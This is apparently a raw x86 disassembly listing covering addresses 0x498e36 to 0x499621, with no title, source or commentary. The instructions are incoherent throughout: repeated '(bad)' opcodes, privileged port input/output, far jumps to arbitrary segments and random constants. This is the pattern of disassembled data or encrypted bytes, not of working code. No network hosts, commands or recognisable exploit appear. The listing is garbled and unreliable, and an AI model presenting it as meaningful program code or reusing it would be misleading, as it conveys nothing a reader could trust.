  498e36:	adc    al,0x9a
  498e38:	xor    eax,0x75295108
  498e3d:	and    ch,dh
  498e3f:	ret    
  498e40:	rcl    DWORD PTR [esi-0x1c17a95e],0x10
  498e47:	push   esi
  498e48:	xor    al,0xa
  498e4a:	mov    edi,0x1957a837
  498e4f:	cli    
  498e50:	ror    DWORD PTR [ebx-0x7534cc09],0xf9
  498e57:	xor    ecx,0xffffffff
  498e5a:	add    DWORD PTR [ebp+0x6448a586],esp
  498e60:	(bad)  
  498e61:	cmp    al,0xb2
  498e63:	sti    
  498e64:	push   edx
  498e65:	aam    0xe1
  498e67:	dec    edx
  498e68:	jne    0x498e86
  498e6a:	and    eax,0x1d3740d
  498e6f:	cmp    eax,0x1201a0b5
  498e74:	and    esi,0x1e04c485
  498e7a:	inc    eax
  498e7b:	dec    esi
  498e7c:	mov    ds:0xa7fc4292,al
  498e81:	test   al,0xff
  498e83:	jmp    0xe33a:0xeff23620
  498e8a:	je     0x498eb3
  498e8c:	jb     0x498e5d
  498e8e:	repz sbb al,0x40
  498e91:	out    0x16,eax
  498e93:	and    al,0x15
  498e95:	fadd   QWORD PTR [esi]
  498e97:	out    dx,eax
  498e98:	dec    esi
  498e99:	pusha  
  498e9a:	aas    
  498e9b:	aam    0xeb
  498e9d:	xchg   esi,eax
  498e9e:	pop    edx
  498e9f:	addr16 inc edx
  498ea1:	(bad)  
  498ea2:	outs   dx,BYTE PTR ds:[esi]
  498ea3:	or     al,0xfd
  498ea5:	mov    DWORD PTR [edi-0x3dcd5],ecx
  498eab:	and    eax,0xfddd88a8
  498eb0:	in     eax,dx
  498eb1:	(bad)  
  498eb2:	mov    ebx,0xdeead9de
  498eb7:	leave  
  498eb8:	fld1   
  498eba:	fld    st(1)
  498ebc:	fprem  
  498ebe:	f2xm1  
  498ec0:	fimul  WORD PTR [edx]
  498ec2:	std    
  498ec3:	fxch   st(1)
  498ec5:	fstp   st(0)
  498ec7:	ret    0xd308
  498eca:	fisub  WORD PTR [ebx+ebx*4+0x35]
  498ece:	in     eax,dx
  498ecf:	sbb    cl,bl
  498ed1:	icebp  
  498ed2:	inc    esi
  498ed3:	repz adc eax,0x8bbedbe0
  498ed9:	ret    0xd9d8
  498edc:	xchg   esi,eax
  498edd:	sahf   
  498ede:	je     0x498ef4
  498ee0:	fld    st(0)
  498ee2:	sbb    bl,dh
  498ee4:	loope  0x498f34
  498ee6:	ins    DWORD PTR es:[edi],dx
  498ee7:	jmp    0x498ec3
  498ee9:	mov    bh,0xa
  498eeb:	rcr    esi,0xf9
  498eee:	fsqrt  
  498ef0:	push   cs
  498ef1:	jmp    0x498f32
  498ef3:	out    dx,al
  498ef4:	pop    eax
  498ef5:	fadd   st(0),st
  498ef7:	pop    ebp
  498ef8:	jge    0x498f35
  498efa:	sar    DWORD PTR [edi+0x15d8e144],cl
  498f00:	push   eax
  498f01:	and    BYTE PTR [eax],bl
  498f03:	gs jbe 0x498f16
  498f06:	popa   
  498f07:	shr    ch,0x7b
  498f0a:	neg    BYTE PTR [ebx-0x372397c4]
  498f10:	fsubp  st(1),st
  498f12:	jmp    0x498f1e
  498f14:	ficomp WORD PTR [edx]
  498f16:	enter  0xfa2b,0xc7
  498f1a:	nop
  498f1b:	popa   
  498f1c:	push   ebx
  498f1d:	xor    dl,dh
  498f1f:	or     eax,0xd9fe11ff
  498f24:	sub    DWORD PTR [edi+0x64],0xffffffe1
  498f28:	or     al,0x19
  498f2a:	clc    
  498f2b:	adc    BYTE PTR gs:[ebx],dh
  498f2e:	adc    BYTE PTR [eax+ebx*1],bh
  498f31:	nop
  498f32:	cli    
  498f33:	in     al,0x47
  498f35:	push   cs
  498f36:	xchg   BYTE PTR [ecx+ebx*8+0x76],al
  498f3a:	and    cl,al
  498f3c:	fstp   st(1)
  498f3e:	push   edi
  498f3f:	sub    DWORD PTR [edx],edi
  498f41:	loopne 0x498ed9
  498f43:	(bad)  
  498f44:	fist   WORD PTR [eax]
  498f46:	adc    al,0x24
  498f48:	fxch   st(2)
  498f4a:	mov    eax,DWORD PTR [esp]
  498f4d:	pcmpeqd mm0,QWORD PTR [edx]
  498f50:	fcom   DWORD PTR [eax+0x1b]
  498f53:	(bad)  
  498f54:	lods   al,BYTE PTR ds:[esi]
  498f55:	pop    edx
  498f56:	loop   0x498fa0
  498f58:	add    bl,BYTE PTR [eax-0x25]
  498f5b:	loopne 0x498fb0
  498f5d:	outs   dx,BYTE PTR ds:[esi]
  498f5e:	mov    ds:0x5742b3b0,al
  498f63:	sub    ecx,DWORD PTR [ecx+0x6a]
  498f66:	push   es
  498f67:	push   0xffffff99
  498f69:	in     al,dx
  498f6a:	mov    dl,0x75
  498f6c:	dec    BYTE PTR [edi]
  498f6e:	add    al,0x9f
  498f70:	xor    eax,0x9ffc30aa
  498f75:	xor    BYTE PTR cs:[edi+ecx*1+0x4908232d],0xc1
  498f7e:	sub    al,0x0
  498f80:	push   esi
  498f81:	fnsave [eax]
  498f83:	xchg   ebp,ebx
  498f85:	jle    0x498f79
  498f87:	cvttps2pi mm3,QWORD PTR [eax-0x3aeec814]
  498f8e:	cmp    al,0x59
  498f90:	js     0x498f1d
  498f92:	ret    0x5824
  498f95:	mov    eax,cs:0x766f1cf9
  498f9b:	add    BYTE PTR [ecx+0x20],bl
  498f9e:	lock sub eax,0x88c40d0a
  498fa4:	call   0x8640088
  498fa9:	pop    ebx
  498faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498fab:	fild   QWORD PTR [esi+eax*1-0x6c]
  498faf:	sbb    ch,ch
  498fb1:	sbb    edx,DWORD PTR [esi-0x7a7b275c]
  498fb7:	sar    BYTE PTR [ecx+0x1e],cl
  498fba:	fstp   DWORD PTR [eax+0xe13a98b]
  498fc0:	cmc    
  498fc1:	or     al,0x24
  498fc3:	xor    ecx,0x1c658adf
  498fc9:	or     BYTE PTR [edi],ah
  498fcb:	xchg   edx,eax
  498fcc:	loop   0x498fe8
  498fce:	cdq    
  498fcf:	ins    DWORD PTR es:[edi],dx
  498fd0:	sbb    edi,DWORD PTR [esi]
  498fd2:	jmp    0x499000
  498fd4:	cmp    ebp,DWORD PTR [edi]
  498fd6:	fcomp  st(2)
  498fd8:	arpl   WORD PTR [ecx+0x11e2429c],cx
  498fde:	inc    esi
  498fdf:	push   ebp
  498fe0:	jg     0x49902d
  498fe2:	jb     0x49905a
  498fe4:	mov    eax,0x7a65cd9
  498fe9:	xchg   esi,eax
  498fea:	add    bh,bl
  498fec:	cld    
  498fed:	ja     0x499006
  498fef:	adc    eax,eax
  498ff1:	push   0x2159df0c
  498ff6:	loopne 0x499054
  498ff8:	push   0x9039a40f
  498ffd:	sbb    al,0xf8
  498fff:	pop    es
  499000:	mov    bh,0xec
  499002:	jae    0x499024
  499004:	aas    
  499005:	fsubr  DWORD PTR [eax+0x33]
  499008:	gs int3 
  49900a:	mov    WORD PTR [eax+0x2e],gs
  49900d:	mov    bl,0x80
  49900f:	and    al,0x3f
  499011:	pop    eax
  499012:	dec    ebp
  499013:	and    esp,edi
  499015:	int3   
  499016:	push   0x7f73cd48
  49901b:	mov    dh,0xef
  49901d:	inc    eax
  49901e:	add    al,0x5
  499020:	subps  xmm2,xmm3
  499023:	pushw  0xed2b
  499027:	and    al,0x68
  499029:	add    dl,BYTE PTR [edi]
  49902b:	out    dx,eax
  49902c:	add    cl,BYTE PTR [eax+0x5f]
  49902f:	ret    0x406a
  499032:	mov    ebx,0xb9220c88
  499037:	cmp    BYTE PTR [ecx+0x1a2d6859],dl
  49903d:	repnz cld 
  49903f:	pushf  
  499040:	push   0x5c7be52
  499045:	jmp    0x499075
  499047:	push   0xb9d27a2d
  49904c:	adc    BYTE PTR [edi],bh
  49904e:	(bad)  
  499050:	inc    ecx
  499051:	fucomp st(1)
  499053:	dec    edx
  499054:	mov    esp,0xf63cf808
  499059:	fadd   st(3),st
  49905b:	iret   
  49905c:	out    0xc,eax
  49905e:	or     ah,BYTE PTR [ebp+0x1e]
  499061:	adc    cl,BYTE PTR [ebx+edi*8+0x3e]
  499065:	ja     0x498fea
  499067:	repz cld 
  499069:	push   esi
  49906a:	mov    esi,0x5eecb3f0
  49906f:	ret    
  499070:	inc    ebx
  499071:	and    dl,BYTE PTR [esi+eax*4]
  499074:	push   0x220eb69e
  499079:	into   
  49907a:	arpl   WORD PTR [esi+ebx*2],cx
  49907d:	pusha  
  49907e:	lock idiv DWORD PTR [ebp+0x320abdaa]
  499085:	rcr    BYTE PTR [eax+ecx*1+0x6068dc11],cl
  49908c:	add    BYTE PTR ds:0xe821281,cl
  499092:	and    BYTE PTR [edi],al
  499094:	sbb    al,0x2
  499096:	or     ecx,DWORD PTR [esi]
  499098:	fsubr  DWORD PTR [edi-0x24]
  49909b:	fcomp  QWORD PTR [edx+edi*8-0x4800a9e0]
  4990a2:	push   ecx
  4990a3:	ins    DWORD PTR es:[edi],dx
  4990a4:	lds    esi,FWORD PTR [eax+0x7d64413b]
  4990aa:	cmp    ecx,DWORD PTR [ebx+0x48d6051]
  4990b0:	sub    BYTE PTR [eax-0x1],0x13
  4990b4:	ror    BYTE PTR [ebx-0x74d15ff0],0x12
  4990bb:	cmp    DWORD PTR [edx+0x18],0xe
  4990bf:	es call 0xeb99f7fc
  4990c5:	mov    eax,DWORD PTR es:[edx]
  4990c8:	push   ecx
  4990c9:	mov    ecx,DWORD PTR [edx+0x18]
  4990cc:	cmc    
  4990cd:	push   eax
  4990ce:	ret    0x1a63
  4990d1:	call   0x90eaddfa
  4990d6:	xchg   ebp,eax
  4990d7:	and    DWORD PTR [eax+0x46fe2f82],edx
  4990dd:	fcomp  DWORD PTR [ebx]
  4990df:	xchg   ebx,eax
  4990e0:	inc    ecx
  4990e1:	sub    BYTE PTR [esi-0x74a43e40],al
  4990e7:	nop    DWORD PTR [edx]
  4990ea:	lock adc DWORD PTR [esi+0x5806ff08],edi
  4990f1:	ret    
  4990f2:	pop    ds
  4990f3:	test   DWORD PTR [esi],eax
  4990f5:	jo     0x49913b
  4990f7:	jno    0x49907c
  4990f9:	les    eax,FWORD PTR [esp+eax*2]
  4990fc:	add    bh,bh
  4990fe:	xchg   esi,eax
  4990ff:	inc    edi
  499100:	(bad)  
  499101:	stc    
  499102:	out    0x83,al
  499104:	rol    DWORD PTR ds:0x7d9f35eb,0x6a
  49910b:	mov    WORD PTR [ecx],?
  49910d:	cdq    
  49910e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49910f:	and    dh,ah
  499111:	dec    esi
  499112:	add    ecx,DWORD PTR [edi]
  499114:	or     BYTE PTR [esi+0x2a22789d],0x4c
  49911b:	adc    BYTE PTR [esi+edx*1],ah
  49911e:	inc    esi
  49911f:	add    al,0xb0
  499121:	nop
  499122:	jb     0x499197
  499124:	or     BYTE PTR [eax+0x61],al
  499127:	or     cl,BYTE PTR [esi-0x6246ed80]
  49912d:	jnp    0x499199
  49912f:	add    DWORD PTR [ecx+0x5a011e6],ebx
  499135:	push   edi
  499136:	cmp    al,0x68
  499138:	xor    BYTE PTR [ecx+0x4cc65228],al
  49913e:	xchg   esi,eax
  49913f:	loopne 0x499163
  499141:	cmp    ah,BYTE PTR [ebx]
  499143:	sub    al,0xf6
  499145:	mov    al,ds:0xb37dd486
  49914a:	add    al,0x8b
  49914c:	xchg   edx,eax
  49914d:	sahf   
  49914e:	xor    ah,al
  499150:	lahf   
  499151:	and    dh,dh
  499153:	inc    ecx
  499154:	adc    bl,al
  499156:	add    edx,DWORD PTR [ebp+0x5a]
  499159:	xor    bl,BYTE PTR [ebx]
  49915b:	jmp    0x4ee2:0x22ffd142
  499162:	add    bh,BYTE PTR [eax]
  499164:	sub    edi,esi
  499166:	inc    eax
  499167:	aaa    
  499168:	dec    edx
  499169:	cmp    ax,WORD PTR [esi]
  49916c:	je     0x499193
  49916e:	push   eax
  49916f:	gs pop ss
  499171:	xchg   BYTE PTR [eax+0x34],cl
  499174:	xor    al,0xbe
  499176:	and    al,0x50
  499178:	dec    ecx
  499179:	fwait
  49917a:	mov    ecx,0x17c694
  49917f:	xchg   esp,eax
  499180:	sbb    ebx,edx
  499182:	int3   
  499183:	hlt    
  499184:	data16 fdiv DWORD PTR [ebp-0x52]
  499188:	mov    dh,0x95
  49918a:	rol    cl,0x18
  49918d:	fmul   st(2),st
  49918f:	sub    ecx,DWORD PTR [eax-0x3c19f687]
  499195:	sbb    edx,DWORD PTR [eax+ebx*8]
  499198:	mov    al,0xd7
  49919a:	les    edx,FWORD PTR [edi]
  49919c:	push   edx
  49919d:	mov    dh,0x1a
  49919f:	retf   0xc09f
  4991a2:	sbb    DWORD PTR [eax-0x3272d400],esi
  4991a8:	je     0x4991d7
  4991aa:	mov    bl,0x3b
  4991ac:	dec    esi
  4991ad:	mov    al,0xe0
  4991af:	wbinvd 
  4991b1:	gs jbe 0x9a0dfb45
  4991b8:	ret    
  4991b9:	add    esp,DWORD PTR [ebp-0x2]
  4991bc:	or     DWORD PTR [eax],edx
  4991be:	push   esi
  4991bf:	loop   0x4991c0
  4991c1:	push   0x9b800105
  4991c6:	fwait
  4991c7:	sar    bl,0x3
  4991ca:	and    al,BYTE PTR [eax+0x32]
  4991cd:	dec    ebp
  4991ce:	inc    ebx
  4991cf:	ret    
  4991d0:	sbb    esp,eax
  4991d2:	pop    edi
  4991d3:	ja     0x499248
  4991d5:	rcl    BYTE PTR [edi+esi*1-0x2],cl
  4991d9:	push   edi
  4991da:	stos   DWORD PTR es:[edi],eax
  4991db:	fwait
  4991dc:	loopne 0x499194
  4991de:	mov    edx,DWORD PTR [esi-0x4]
  4991e1:	ds inc ecx
  4991e3:	mov    eax,0x3145e90
  4991e8:	pop    esp
  4991e9:	adc    ebx,ecx
  4991eb:	and    cl,bh
  4991ed:	mov    ebx,0x87a06956
  4991f2:	add    al,0x23
  4991f4:	mov    ebp,DWORD PTR [ebx]
  4991f6:	cs adc al,0x50
  4991f9:	dec    esp
  4991fa:	enter  0x1bf8,0xc2
  4991fe:	add    DWORD PTR [ecx+edx*1+0x45],ebx
  499202:	and    eax,0xcbf2bf5
  499207:	data16 rcl BYTE PTR [edi],1
  49920a:	xor    cl,bh
  49920c:	inc    BYTE PTR [eax+0x4072c2f9]
  499212:	xchg   ebp,eax
  499213:	(bad)  
  499214:	adc    DWORD PTR [edx-0x21],edi
  499217:	ja     0x499220
  499219:	mov    edi,0xe02020e3
  49921e:	out    dx,eax
  49921f:	mov    esi,0x23ca9b9
  499224:	(bad)  
  499226:	jb     0x499257
  499228:	hlt    
  499229:	ja     0x499255
  49922b:	mov    edi,0x54042803
  499230:	jo     0x49924a
  499232:	fucomi st,st(4)
  499234:	push   ss
  499235:	call   0x974c9db0
  49923a:	xor    BYTE PTR [edx+0x16],0x8
  49923e:	mov    edi,0x6c5d1177
  499243:	push   eax
  499244:	mov    gs:0x5fd903eb,al
  49924a:	mov    ds:0x15a207a8,eax
  49924f:	xchg   esi,eax
  499250:	pop    edi
  499251:	mov    edx,0x90aa15b
  499256:	je     0x4991e1
  499258:	hlt    
  499259:	clc    
  49925a:	neg    DWORD PTR [esi]
  49925c:	cwde   
  49925d:	cmp    al,0xf8
  49925f:	and    BYTE PTR [esi+0xc],bh
  499262:	not    DWORD PTR [ecx+0x3]
  499265:	ins    BYTE PTR es:[edi],dx
  499266:	test   BYTE PTR [ebx-0x28],0x5b
  49926a:	nop
  49926b:	mov    ebp,0xcf566df2
  499270:	pop    esp
  499271:	push   edi
  499272:	test   DWORD PTR [edi-0x77c0aceb],0xfffddab5
  49927c:	in     eax,0xee
  49927e:	mov    ah,0x7f
  499280:	xchg   DWORD PTR [eax-0x7c4bd6b0],esi
  499286:	inc    DWORD PTR [ebx]
  499288:	sub    ah,al
  49928a:	sbb    ecx,DWORD PTR [ecx]
  49928c:	add    al,0x38
  49928e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49928f:	(bad)  
  499290:	(bad)  
  499292:	out    0xdc,al
  499294:	xor    edx,DWORD PTR [eax+0x5d96b417]
  49929a:	std    
  49929b:	cmp    ebx,ebp
  49929d:	cmp    BYTE PTR [ebx-0x22],0x56
  4992a1:	xchg   esp,eax
  4992a2:	pop    edi
  4992a3:	mov    ebp,0xc008438c
  4992a8:	daa    
  4992a9:	test   al,0x1c
  4992ab:	adc    al,0x10
  4992ad:	(bad)  
  4992ae:	and    al,0xb
  4992b0:	push   ebx
  4992b1:	imul   edx,DWORD PTR [edx+0x25],0x74
  4992b5:	neg    BYTE PTR ds:0x460bc01b
  4992bb:	inc    eax
  4992bc:	fisubr WORD PTR [ecx+esi*8-0x49]
  4992c0:	dec    esp
  4992c1:	call   0x65ff:0x2c9e045b
  4992c8:	ret    
  4992c9:	rcr    DWORD PTR [esi],cl
  4992cb:	xor    eax,DWORD PTR [eax+0x57c4a1]
  4992d1:	jp     0x499306
  4992d3:	arpl   WORD PTR [ebx-0x77e49339],sp
  4992d9:	pop    esi
  4992da:	ins    DWORD PTR es:[edi],dx
  4992db:	add    al,0x98
  4992dd:	pusha  
  4992de:	xor    esi,DWORD PTR [ecx+0x40]
  4992e1:	xchg   BYTE PTR [ebx],cl
  4992e3:	les    edx,FWORD PTR [ecx]
  4992e5:	push   edx
  4992e6:	jbe    0x499277
  4992e8:	mov    esi,0x98994528
  4992ed:	sbb    al,0x5d
  4992ef:	fsub   DWORD PTR [ebx-0x13bce5b8]
  4992f5:	aam    0x3
  4992f7:	cli    
  4992f8:	jnp    0x49932b
  4992fa:	lock push ebx
  4992fc:	fwait
  4992fd:	dec    edx
  4992fe:	push   cs
  4992ff:	ficomp WORD PTR [edx-0x17aadbb8]
  499305:	add    al,0x27
  499307:	jbe    0x499337
  499309:	sbb    eax,DWORD PTR [ecx+0x7ba841bc]
  49930f:	adc    al,0x49
  499311:	xchg   edx,eax
  499312:	jmp    0xca9:0xa0b21f6a
  499319:	xor    al,0x2
  49931b:	inc    ecx
  49931c:	stos   BYTE PTR es:[edi],al
  49931d:	inc    esi
  49931e:	cld    
  49931f:	into   
  499320:	inc    esp
  499321:	shr    BYTE PTR [esi],1
  499323:	data16 adc ch,0xf0
  499327:	xor    ebx,edi
  499329:	or     ah,BYTE PTR [ecx]
  49932b:	jmp    0xcd19582
  499330:	or     cl,BYTE PTR [ebp+0x5806d56f]
  499336:	dec    ebp
  499337:	add    al,0x12
  499339:	dec    edi
  49933a:	mov    eax,ebx
  49933c:	call   0xb7ec:0xc2e9ff1
  499343:	clc    
  499344:	push   es
  499345:	leave  
  499346:	cwde   
  499347:	dec    ebx
  499348:	pusha  
  499349:	dec    ecx
  49934a:	scas   eax,DWORD PTR es:[edi]
  49934b:	sub    al,BYTE PTR ds:0x4065b92a
  499351:	mov    al,dl
  499353:	xor    cl,BYTE PTR [ebx+0x4e394b0d]
  499359:	jns    0x49936b
  49935b:	add    al,0x35
  49935d:	xor    BYTE PTR [ecx],0xd2
  499360:	into   
  499361:	mov    al,ds:0x80a6a0b1
  499366:	adc    dl,BYTE PTR [ecx+eiz*8]
  499369:	dec    edx
  49936a:	pop    ss
  49936b:	cmp    eax,0x590ec1fa
  499370:	add    bh,ah
  499372:	inc    edx
  499373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  499374:	add    al,0xe4
  499376:	add    eax,0x79c374e0
  49937b:	dec    edi
  49937c:	push   edx
  49937d:	rcl    BYTE PTR [eax],cl
  49937f:	in     al,0xb6
  499381:	push   esi
  499382:	stos   DWORD PTR es:[edi],eax
  499383:	sahf   
  499384:	jbe    0x499384
  499386:	jo     0x499386
  499388:	lods   al,BYTE PTR ds:[esi]
  499389:	inc    ebx
  49938a:	mov    eax,0x92aad9e1
  49938f:	mov    dl,BYTE PTR [esi-0x7b80b14]
  499395:	mov    ecx,DWORD PTR ds:0xbbb45ddc
  49939b:	mov    bl,bh
  49939d:	adc    ecx,DWORD PTR [edx-0x2fdbfe50]
  4993a3:	cmp    al,0xa7
  4993a5:	sub    ecx,DWORD PTR [edx]
  4993a7:	ja     0x4993be
  4993a9:	adc    ecx,esp
  4993ab:	retf   0x1404
  4993ae:	loop   0x499384
  4993b0:	xchg   ebp,eax
  4993b1:	fld    st(2)
  4993b3:	div    BYTE PTR [edi+0x14]
  4993b6:	add    DWORD PTR [ebx],ecx
  4993b8:	inc    ecx
  4993b9:	add    al,0x75
  4993bb:	adc    BYTE PTR [edx],dh
  4993bd:	adc    bl,ch
  4993bf:	add    esp,esi
  4993c1:	aad    0x66
  4993c3:	xchg   DWORD PTR [ebp+0x3260f07b],edx
  4993c9:	dec    ecx
  4993ca:	or     al,0x68
  4993cc:	add    edx,DWORD PTR [ebp+0x61]
  4993cf:	outs   dx,DWORD PTR ds:[esi]
  4993d0:	mov    bh,0xd4
  4993d2:	pop    eax
  4993d3:	rol    BYTE PTR [eax+eax*8+0x1393892],1
  4993da:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4993dc:	adc    BYTE PTR [esi-0x51],dh
  4993df:	adc    edx,ebp
  4993e1:	adc    esi,ecx
  4993e3:	pusha  
  4993e4:	jbe    0x4993ec
  4993e6:	fidivr DWORD PTR [ebx]
  4993e8:	jns    0x499388
  4993ea:	fucomip st,st(7)
  4993ec:	fadd   QWORD PTR [eax]
  4993ee:	mov    esp,0x40c31fdc
  4993f3:	(bad)  
  4993f4:	out    dx,al
  4993f5:	or     ch,bl
  4993f7:	call   0x386a8cfe
  4993fc:	pop    es
  4993fd:	das    
  4993fe:	hlt    
  4993ff:	add    dl,ch
  499401:	loop   0x499471
  499403:	loopne 0x49944c
  499405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499406:	in     eax,dx
  499407:	xor    BYTE PTR [ebp+0x27],dh
  49940a:	sbb    al,0x60
  49940c:	pusha  
  49940d:	or     dl,BYTE PTR fs:[edx]
  499410:	fmul   st,st(1)
  499412:	add    dh,bh
  499414:	mov    dl,0x58
  499416:	jne    0x499431
  499418:	push   0x29
  49941a:	add    eax,0xa
  49941d:	rcl    DWORD PTR [ecx],1
  49941f:	ja     0x4993ca
  499421:	add    ebx,DWORD PTR [esi+edi*4]
  499424:	mov    esi,0xb738ff04
  499429:	rcr    DWORD PTR ds:0x58128c21,0x14
  499430:	add    cl,BYTE PTR [edx+0x7c]
  499433:	push   0x2c394e0a
  499438:	cmp    BYTE PTR ds:0x67aaf609,dl
  49943e:	cmp    edx,DWORD PTR [ecx]
  499440:	loop   0x49947b
  499442:	add    al,0x7f
  499444:	sbb    bl,BYTE PTR [esi]
  499446:	and    al,0xbb
  499448:	add    ah,BYTE PTR [ebx-0x51]
  49944b:	rcl    BYTE PTR [edx-0x6d],0x1b
  49944f:	mov    edi,0xab848e10
  499454:	ror    DWORD PTR [esi+0x32],cl
  499457:	es out dx,eax
  499459:	mov    al,ds:0x188ca2c0
  49945e:	push   eax
  49945f:	push   es
  499460:	int3   
  499461:	inc    ecx
  499462:	lock mov esp,0x970f26ef
  499468:	push   es
  499469:	mov    ds:0x72b059ab,al
  49946e:	inc    eax
  49946f:	pop    esi
  499470:	fild   QWORD PTR [ebp+0x2b]
  499473:	jmp    0xb3b7be57
  499478:	mov    cs,WORD PTR [ecx+edi*1-0x25]
  49947c:	cmp    BYTE PTR [ecx],0x6
  49947f:	fld1   
  499481:	adc    al,0x63
  499483:	popa   
  499484:	retf   0xb8bd
  499487:	or     ecx,DWORD PTR [eax-0x2cfe86ea]
  49948d:	mov    ds:0x5a6f562e,al
  499492:	sbb    al,0x61
  499494:	inc    eax
  499495:	or     DWORD PTR [ecx],eax
  499497:	adc    eax,0x69f80363
  49949c:	mov    ah,0x7e
  49949e:	or     al,0x34
  4994a0:	sbb    edi,DWORD PTR [edx]
  4994a2:	cdq    
  4994a3:	ret    0x137e
  4994a6:	je     0x499490
  4994a8:	add    DWORD PTR cs:[eax-0x1e],esi
  4994ac:	inc    esp
  4994ad:	mov    eax,DWORD PTR [eax+0x20]
  4994b0:	adc    cl,BYTE PTR [ecx]
  4994b2:	sub    eax,0xc4e66bd
  4994b7:	jl     0x4994aa
  4994b9:	sbb    BYTE PTR [ebp*1+0x3e517d20],ah
  4994c0:	inc    edx
  4994c1:	mov    WORD PTR [ecx-0x8],es
  4994c4:	ja     0x499502
  4994c6:	sub    BYTE PTR [esi+0x42],cl
  4994c9:	adc    al,0x99
  4994cb:	mov    eax,DWORD PTR [ecx+ebx*4+0x4]
  4994cf:	lea    edi,[edx+ebp*4]
  4994d2:	adc    ah,BYTE PTR [edi+0x2104433b]
  4994d8:	(bad)  
  4994d9:	rcl    al,1
  4994db:	adc    dh,BYTE PTR [edi+0x2d476efb]
  4994e1:	mov    DWORD PTR [edi],ecx
  4994e3:	inc    edx
  4994e4:	push   esp
  4994e5:	add    DWORD PTR [ecx+0x430c9644],ecx
  4994eb:	dec    edx
  4994ec:	add    BYTE PTR [esi-0x25c40ff0],0x7c
  4994f3:	retf   0xb67f
  4994f6:	jo     0x499558
  4994f8:	jp     0x49948e
  4994fa:	outs   dx,DWORD PTR ds:[esi]
  4994fb:	iret   
  4994fc:	cli    
  4994fd:	dec    edx
  4994fe:	dec    edi
  4994ff:	or     edx,DWORD PTR [edi+0x2]
  499502:	or     eax,0x1a50c94e
  499507:	shl    BYTE PTR [esi],0x8b
  49950a:	fild   DWORD PTR [ecx+ecx*4]
  49950d:	push   ecx
  49950e:	sbb    al,al
  499510:	rcl    bh,0x2e
  499513:	dec    ebp
  499514:	pushf  
  499515:	push   cs
  499516:	pop    edx
  499517:	pop    ss
  499518:	push   esi
  499519:	jne    0x4994d0
  49951b:	iret   
  49951c:	pop    eax
  49951d:	add    dl,BYTE PTR [ecx-0x80]
  499520:	loope  0x499560
  499522:	je     0x499526
  499524:	mov    edx,0x30b3b721
  499529:	dec    BYTE PTR [ebp+0x333f0279]
  49952f:	ss out dx,al
  499531:	add    BYTE PTR [edx],0x54
  499534:	cld    
  499535:	cmp    al,0xda
  499537:	xlat   BYTE PTR ds:[ebx]
  499538:	adc    ah,BYTE PTR [eax+0x26]
  49953b:	pusha  
  49953c:	or     ecx,DWORD PTR [esi+0x14]
  49953f:	push   ds
  499540:	in     al,dx
  499541:	inc    DWORD PTR [ecx]
  499543:	outs   dx,BYTE PTR ds:[esi]
  499544:	push   edi
  499545:	and    BYTE PTR [esp+ebx*1+0x56],dh
  499549:	push   0x42f6fac
  49954e:	cs xor al,bh
  499551:	inc    esi
  499552:	sub    al,0xf
  499554:	clc    
  499555:	sub    BYTE PTR [ebx],al
  499557:	mov    ebx,0xbec33230
  49955c:	in     al,0x92
  49955e:	fild   QWORD PTR [eax+0x70143f40]
  499564:	add    al,BYTE PTR [eax+eax*8+0x24e5e579]
  49956b:	outs   dx,DWORD PTR ds:[esi]
  49956c:	add    ebp,DWORD PTR [eax-0x34]
  49956f:	jp     0x4995a1
  499571:	add    ebp,DWORD PTR [esp+eax*1]
  499574:	ja     0x499580
  499576:	or     al,0x0
  499578:	cmp    DWORD PTR [edx],esi
  49957a:	xor    DWORD PTR [edx],0x92c13611
  499580:	add    BYTE PTR [edx],dl
  499582:	sub    al,0x84
  499584:	jnp    0x499565
  499586:	dec    ebx
  499587:	sahf   
  499588:	out    dx,al
  499589:	mov    ebp,0x47c7b8ce
  49958e:	sub    DWORD PTR [edi],edx
  499590:	fild   DWORD PTR [ecx]
  499592:	push   esi
  499593:	push   eax
  499594:	js     0x499526
  499596:	add    al,BYTE PTR [eax-0x411fe86]
  49959c:	jp     0x499617
  49959e:	sahf   
  49959f:	mov    ah,0xec
  4995a1:	xchg   edx,eax
  4995a2:	inc    ebx
  4995a3:	cmp    BYTE PTR [eax],dh
  4995a5:	iret   
  4995a6:	jmp    DWORD PTR [ecx-0x5a]
  4995aa:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4995ac:	out    0x2,eax
  4995ae:	mov    ebx,0x34b076d8
  4995b3:	fisttp DWORD PTR [edx+eax*1-0x41]
  4995b7:	into   
  4995b8:	dec    edi
  4995b9:	icebp  
  4995ba:	f2xm1  
  4995bc:	(bad)  
  4995bd:	fisttp WORD PTR [ebp-0x9]
  4995c0:	inc    edi
  4995c1:	sub    BYTE PTR [eax+eax*8+0x3d297ac3],dh
  4995c8:	cmp    ah,ah
  4995ca:	add    BYTE PTR [edi-0x50],dl
  4995cd:	sub    eax,0x7081206f
  4995d2:	cmp    BYTE PTR [esi+0x53],ah
  4995d5:	push   es
  4995d6:	or     dh,BYTE PTR [eax]
  4995d8:	out    0xd7,eax
  4995da:	sub    DWORD PTR [ecx+ecx*8],ecx
  4995dd:	push   es
  4995de:	pushf  
  4995df:	mov    bh,0x1d
  4995e1:	je     0x4995f1
  4995e3:	xchg   edi,eax
  4995e4:	mov    dl,0x0
  4995e6:	xor    ecx,DWORD PTR [eax]
  4995e8:	mov    DWORD PTR [ebp-0x22d648e9],edi
  4995ee:	cs cld 
  4995f0:	push   ds
  4995f1:	fdivr  DWORD PTR [ecx]
  4995f3:	into   
  4995f4:	pop    DWORD PTR [ecx-0x3d]
  4995f7:	sahf   
  4995f8:	mov    eax,0x584361db
  4995fd:	into   
  4995fe:	(bad)  
  4995ff:	popf   
  499600:	fstp   QWORD PTR [ebp+0x5d]
  499603:	or     eax,eax
  499605:	jo     0x499638
  499607:	lods   al,BYTE PTR ds:[esi]
  499608:	mov    bl,0xb8
  49960a:	or     BYTE PTR [ecx+0xc],ah
  49960d:	ds aad 0x7d
  499610:	mov    bh,bh
  499612:	and    DWORD PTR [eax+eax*4],ecx
  499615:	push   esi
  499616:	mov    eax,ds:0x6830fc60
  49961b:	pop    esp
  49961c:	or     al,0x60
  49961e:	fsub   DWORD PTR [ecx+0x68]
  499621:	loopne 0x499612
